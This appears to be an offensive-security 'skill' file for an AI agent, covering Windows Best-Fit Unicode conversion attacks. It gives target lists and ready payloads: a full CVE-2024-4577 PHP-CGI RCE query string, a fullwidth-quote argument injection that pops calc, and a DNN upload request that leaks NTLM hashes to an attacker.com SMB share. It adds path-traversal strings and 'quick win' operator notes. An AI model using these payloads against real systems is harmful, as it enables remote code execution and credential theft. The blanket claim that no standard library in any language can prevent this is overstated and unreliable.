---
name: windows-unicode-attacks
description: "Exploit Windows best-fit / WorstFit Unicode-to-ANSI conversion — fullwidth character smuggling into PHP-CGI arguments (CVE-2024-4577), .NET filename smuggling, and NTLM hash theft via UNC paths. Use when the target runs Windows/IIS with PHP-CGI, XAMPP, or DotNetNuke and plain ASCII payloads are being filtered."
---

# Windows Best-Fit / WorstFit Unicode-to-ANSI Attacks

## Crown Jewel Targets

- XAMPP installations on Windows (PHP-CGI RCE, CVE-2024-4577)
- Windows IIS servers with PHP-CGI configured
- DNN/DotNetNuke installations (.NET filename smuggling, NTLM hash theft)
- Any Windows application passing user input to `system()` or `CreateProcess()`
- Japanese systems (CP 932: Yen sign to backslash mapping)
- Korean systems (CP 949: Won sign to backslash mapping)

## Attack Surface Signals

- `Server: Microsoft-IIS`, `X-Powered-By: ASP.NET`, `X-Powered-By: PHP`
- Windows error messages, NTFS path patterns in responses
- PHP-CGI indicators: `.php` URLs on Windows server
- XAMPP default page, Apache on Windows
- Code page indicators: `Accept-Language` with `ja`, `ko` locales

**Source:** Orange Tsai (DEVCORE), Black Hat USA 2025
**CVEs:** CVE-2024-4577 (PHP-CGI), CVE-2024-45720 (Apache SVN), CVE-2024-49026 (Excel), CVE-2024-8067 (Perforce)
**Affected:** Any Windows program using ANSI APIs (int main, getenv, getcwd, FindFirstFileA, etc.)

## Core Concept

Windows stores strings as UTF-16 but maintains ANSI APIs for backward compatibility. When converting UTF-16 to ANSI, characters without exact matches undergo "Best-Fit" mapping — substitution with visually similar ASCII characters. This conversion happens AFTER application-level sanitization.

## Attack Technique 1: Argument Splitting

Characters mapped to `"` (0x22) or `\` (0x5C) break argument boundaries after escaping.

### Key Mappings

| Unicode | Name | Maps To | Code Pages |
|---------|------|---------|------------|
| U+FF02 (") | Fullwidth Quote | `"` | CP 874, 1250-1258 |
| U+FF3C (\) | Fullwidth Backslash | `\` | CP 874, 1250-1258 |
| U+00A5 (¥) | Yen Sign | `\` | CP 932 (Japanese) |
| U+20A9 (₩) | Won Sign | `\` | CP 949 (Korean) |

### PHP Example (appears secure, is not)

```php
<?php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

**Payload:** `path=＂ --use-askpass=calc ＂` → pops calc.exe

### Python Example

```python
subprocess.run(["wget", "-q", f"https://example.tld/{path}.txt"])
```

Same payload works — **no standard library in any language can prevent this**.

### Yen Sign Variant (Japanese CP 932)

```python
subprocess.run(['vuln.exe', 'foo¥" bar'])
# Python escapes → "foo¥\" bar"
# Best-Fit converts ¥→\ → "foo\\" bar" (backslash escapes itself, quote unescaped)
```

## Attack Technique 2: Filename Smuggling

Characters mapped to `/` or `\` enable path traversal through ANSI APIs.

| Unicode | Maps To | Code Pages |
|---------|---------|------------|
| U+FF0F (/) | `/` | Most CPs |
| U+FF3C (\) | `\` | CP 874, 1250-1258 |
| U+00A5 (¥) | `\` | CP 932 |
| U+20A9 (₩) | `\` | CP 949 |

### DNN/DotNetNuke Exploitation (CVE-2025-52488)

.NET's `Encoding.GetEncoding(1251).GetBytes()` converts fullwidth chars AFTER security checks:

```
file．ext＼＼attacker．com＼share → file.ext\\attacker.com\share
```

Combined with `Path.Combine` (absolute path wins) + `File.Exists` (triggers SMB auth):

```http
POST /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx
Content-Disposition: form-data; name="file"; filename="%EF%BC%BC%EF%BC%BCattacker%EF%BC%8Ecom%EF%BC%BCshare%EF%BC%BC%EF%BC%BCan.jpg"
```

Result: NTLM hash leaked to attacker's SMB server (pre-auth).

## Attack Technique 3: Environment Variable Confusion

CGI environment variables undergo Best-Fit conversion via ANSI APIs.

**Apache CGI on CP 1250:** `/cgi.pl/%E0dmin` → CGI receives `/admin` (bypasses web server rules)

**PHP-CGI LFI on Japanese systems:** `/index.php/..¥..¥windows/win.ini/` → PHP-CGI sees `..\..\windows\win.ini`

## CVE-2024-4577: PHP-CGI Argument Injection

The 2012 PHP-CGI fix blocks query strings starting with `-`:

```c
if (*p == '-') { skip_getopt = 1; }
```

**Bypass:** `?%ADs` — U+00AD (soft hyphen) maps to `-` on CP 932/936/950.

**Full RCE payload:**
```
?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```

**Affected:** PHP < 8.3.8, < 8.2.20, < 8.1.29 on Windows. XAMPP vulnerable by default.

## Detection / Testing

1. Identify Windows servers (IIS, Apache on Windows, XAMPP)
2. Determine code page via `Accept-Language` or server locale
3. Test fullwidth characters in filenames, parameters, headers
4. For PHP-CGI: send `?%ADs` and check for argument injection behavior
5. For command injection: try `＂` (U+FF02) in parameters passed to system()
6. For path traversal: try `＼` (U+FF3C) or `¥` (U+00A5) in file paths

## Affected Programs (Confirmed)

| Program | Status |
|---------|--------|
| PHP php-cgi.exe | CVE-2024-4577 (patched) |
| Apache SVN svn.exe | CVE-2024-45720 |
| Oracle Java java.exe | Pending fix |
| Curl (official) | Won't fix |
| Perl perl.exe | Won't fix |
| PostgreSQL psql.exe | Won't fix |

## Bug Bounty Relevance

- **CRITICAL**: PHP-CGI RCE on Windows (XAMPP default)
- **HIGH**: Command injection bypass on any Windows target
- **HIGH**: NTLM hash theft via filename smuggling on .NET apps
- **MEDIUM**: Path traversal via Unicode chars on Japanese/Korean systems

## Operator Notes (Battle-Tested)

- **Best-Fit conversion happens AFTER escaping**: This is the fundamental issue. The application escapes the input, then Windows converts Unicode to ANSI, undoing the escaping. No standard library in any language can prevent this.
- **Fullwidth quote `U+FF02` maps to `"`**: On CP 874/1250-1258. Breaks argument boundaries after the application has already escaped the input. Test on every Windows target accepting user input in system calls.
- **PHP-CGI `?%ADs` is the quick win**: Soft hyphen maps to `-` on CP 932/936/950, bypassing the 2012 PHP-CGI fix. Full RCE payload: `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`.
- **DNN/DotNetNuke NTLM theft is pre-auth**: Fullwidth backslash `U+FF3C` in upload filename triggers SMB authentication to attacker. No login required.
- **Yen sign `U+00A5` on Japanese systems**: Maps to backslash on CP 932. Python's `subprocess.run` escapes `¥"` to `"foo¥\" bar"`, then Best-Fit converts `¥` to `\`, creating `"foo\\" bar"` (backslash escapes itself, quote is unescaped).
- **No fix exists for most programs**: Oracle Java, Curl, Perl, PostgreSQL = won't fix. This is a systemic Windows platform issue.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `iis-shortname-exploitation` | IIS enumeration + Unicode attacks |
| `server-confusion-attacks` → `references/apache-confusion-attacks.md` | Apache on Windows UNC SSRF |
| `server-confusion-attacks` | Path confusion with Unicode chars |
| `deserialization-testing` → `references/dotnet-deserialization-advanced.md` | .NET targets on Windows |
| `file-upload-testing` → `references/polyglot-file-upload-rce.md` | Filename smuggling in uploads |
